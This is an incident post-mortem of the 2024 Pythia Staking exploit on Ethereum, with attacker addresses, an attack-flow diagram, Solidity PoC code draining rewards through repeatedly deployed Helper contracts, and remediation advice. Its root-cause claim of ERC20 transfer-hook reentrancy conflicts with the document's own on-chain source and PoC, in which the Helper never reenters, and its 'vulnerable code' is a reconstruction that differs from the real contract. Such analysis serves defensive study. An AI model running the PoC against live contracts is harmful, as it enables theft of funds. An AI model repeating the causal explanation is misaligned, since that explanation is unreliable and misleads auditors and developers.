# Pythia — Analysis of Infinite Staking Reward Extraction via claimRewards Reentrancy Attack

| Field | Details |
|------|------|
| **Date** | 2024-09-04 |
| **Protocol** | Pythia Staking |
| **Chain** | Ethereum |
| **Loss** | ~21 ETH |
| **Attacker** | [0xd861e6f1760d014d6ee6428cf7f7d732563c74c0](https://etherscan.io/address/0xd861e6f1760d014d6ee6428cf7f7d732563c74c0) |
| **Attack Tx** | [0x7e19f8edb1f1666322113f15d7674593950ac94bbc25d2aff96adabdcae0a6c3](https://etherscan.io/tx/0x7e19f8edb1f1666322113f15d7674593950ac94bbc25d2aff96adabdcae0a6c3) |
| **Vulnerable Contract** | [0xe2910b29252F97bb6F3Cc5E66BfA0551821C7461](https://etherscan.io/address/0xe2910b29252F97bb6F3Cc5E66BfA0551821C7461) |
| **Attack Contract** | [0x542533536e314180e1b9f00b2c046f6282eb3647](https://etherscan.io/address/0x542533536e314180e1b9f00b2c046f6282eb3647) |
| **Root Cause** | PythiaStaking's `claimRewards()` executes token `transfer()` before updating state — repeated reward claims via reentrancy through ERC20 transfer hooks |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Pythia_exp.sol) |

---

## 1. Vulnerability Overview

The `claimRewards()` function in the Pythia Staking contract (`0xe2910b...`) did not follow the Checks-Effects-Interactions pattern. After calculating the reward amount, it transferred PYTHIA tokens (`0x66149a...`) via `transfer()` before resetting `lastClaimTime` or the reward balance. The attacker deployed a Helper contract that called `claimRewards()` and immediately returned the received tokens to the parent contract, repeating this process 30 times to drain approximately 21 ETH worth of rewards.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: CEI violation — transfer executed before state update
// PythiaStaking: 0xe2910b29252F97bb6F3Cc5E66BfA0551821C7461
function claimRewards() external {
    uint256 reward = _calculateReward(msg.sender);
    // ❌ transfer executed after reward calculation but before state reset
    IERC20(PYTHIA_TOKEN).transfer(msg.sender, reward);  // ❌ reentrancy entry point
    // State update follows — reward already recalculated upon reentry
    stakes[msg.sender].lastClaimTime = block.timestamp;
}

// ✅ Correct code: CEI pattern applied
function claimRewards() external nonReentrant {
    uint256 reward = _calculateReward(msg.sender);
    // ✅ State updated first (Effects)
    stakes[msg.sender].lastClaimTime = block.timestamp;
    stakes[msg.sender].pendingReward = 0;
    // ✅ External call follows (Interactions)
    IERC20(PYTHIA_TOKEN).transfer(msg.sender, reward);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: PythiaTokenStaking.sol
    function claimRewards() external {  // ❌ Vulnerability
        distributeRewards();
        uint256 rewardAmount = setupClaim(_msgSender());
        uint256 escrowedRewardAmount = rewardAmount * escrowPortion / 1e18;
        uint256 nonEscrowedRewardAmount = rewardAmount - escrowedRewardAmount;

        if(escrowedRewardAmount != 0 && address(escrowPool) != address(0)) {
            escrowPool.vestingLock(_msgSender(), escrowedRewardAmount);
        }

        // ignore dust
        if(nonEscrowedRewardAmount > 1) {
            rewardToken.safeTransfer(_msgSender(), nonEscrowedRewardAmount);
        }

        emit RewardsClaimed(_msgSender(), escrowedRewardAmount, nonEscrowedRewardAmount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0xd861e6...)
  │
  ├─[1]─► Deploy AttackContract and purchase PYTHIA tokens with 0.5 ETH
  │         └─► swapExactETHForTokensSupportingFeeOnTransferTokens
  │               └─► WETH → PYTHIA (Uniswap V2)
  │
  ├─[2]─► Call PythiaStaking.stake(pythiaBal)
  │         └─► Deposit PYTHIA tokens into staking contract
  │
  ├─[3]─► claimRewards() loop (30 iterations):
  │         ├─► Check current staking balance: spythia.balanceOf(this)
  │         ├─► Deploy new Helper contract
  │         ├─► Transfer all staking tokens to Helper
  │         └─► Call helper.attack():
  │               ├─► Execute spythia.claimRewards()
  │               │     └─► ❌ transfer executed → PYTHIA sent to Helper
  │               │           └─► transfer completes before state update
  │               ├─► Transfer PYTHIA → AttackContract
  │               └─► Return staking tokens → AttackContract
  │
  ├─[4]─► After loop ends, transfer staking tokens → attacker
  │
  ├─[5]─► Swap accumulated PYTHIA → WETH
  │
  └─[6]─► Total loss: ~21 ETH
```

## 4. PoC Code (Core Logic + Comments)

```solidity
address constant PYTHIA_STAKING = 0xe2910b29252F97bb6F3Cc5E66BfA0551821C7461;
address constant PYTHIA_TOKEN = 0x66149ab384Cc066FB9E6bC140F1378D1015045E9;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

contract AttackContract {
    address attacker;

    function stake() payable public {
        // [1] Swap ETH → PYTHIA
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER))
            .swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.5 ether}(
                10 * 1e18, path, address(this), block.timestamp
            );
        uint256 bal = IERC20(PYTHIA_TOKEN).balanceOf(address(this));
        IERC20(PYTHIA_TOKEN).approve(PYTHIA_STAKING, type(uint256).max);
        // [2] Stake PYTHIA
        IPythiaStaking(PYTHIA_STAKING).stake(bal);
    }

    function claimRewards() public {
        IPythiaStaking spythia = IPythiaStaking(PYTHIA_STAKING);

        for (uint256 i = 0; i < 30; i++) {
            uint256 stakeBal = spythia.balanceOf(address(this));
            // [3] Deploy Helper and transfer staking tokens
            Helper helper = new Helper();
            spythia.transfer(address(helper), stakeBal);
            // Helper calls claimRewards() → receives PYTHIA then returns tokens
            helper.attack();

            // Restake received PYTHIA
            uint256 bal = IERC20(PYTHIA_TOKEN).balanceOf(address(this));
            spythia.stake(bal);
        }
        spythia.transfer(attacker, spythia.balanceOf(address(this)));
    }
}

contract Helper {
    function attack() public {
        IPythiaStaking spythia = IPythiaStaking(PYTHIA_STAKING);
        // ❌ claimRewards(): transfer before state update → duplicate claims
        spythia.claimRewards();
        uint256 bal = IERC20(PYTHIA_TOKEN).balanceOf(address(this));
        IERC20(PYTHIA_TOKEN).transfer(msg.sender, bal);
        spythia.transfer(msg.sender, spythia.balanceOf(address(this)));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Reentrancy Attack |
| **Attack Technique** | CEI Violation + ERC20 Transfer Hook Reentrancy |
| **DASP Category** | Reentrancy |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Severity** | Critical |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Apply CEI Pattern**: In `claimRewards()`, execute state updates (Effects) before `transfer()` (Interactions).
2. **nonReentrant Modifier**: Apply OpenZeppelin `ReentrancyGuard`'s `nonReentrant` to both `claimRewards()` and `stake()`.
3. **Pull Pattern**: Rather than transferring rewards immediately, record unclaimed balances and allow users to withdraw separately.
4. **Prevent Reward Recalculation**: Execute `lastClaimTime = block.timestamp` first so that rewards return 0 on reentry within the same block.

## 7. Key Takeaways

- **Importance of the CEI Pattern**: External calls before state changes are the classic cause of reentrancy attacks.
- **ERC20 transfer is also reentrant**: Not only ETH transfers, but ERC20 `transfer()` calls can also be reentered through recipient hooks.
- **Helper Contract Pattern**: Be aware of the pattern where an attacker deploys a new contract on each iteration to reset state.